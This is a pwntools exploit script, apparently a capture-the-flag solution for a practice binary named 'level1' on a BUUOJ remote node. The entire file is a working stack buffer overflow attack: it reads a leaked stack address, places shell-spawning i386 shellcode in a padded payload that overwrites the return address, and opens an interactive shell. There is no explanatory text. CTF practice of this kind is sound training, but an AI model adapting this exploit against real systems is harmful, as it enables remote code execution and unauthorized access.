from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
# io = process('./level1')
io = remote('node4.buuoj.cn',27684)
elf = ELF('./level1')
io.sendline(b'')
io.recvuntil(b'What\'s this:')
stack_addr = io.recv(10)
stack_addr = int(str(stack_addr,encoding='utf-8'),16)

shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(0x88+4, b'a') + p32(stack_addr)
io.send(payload)
io.interactive()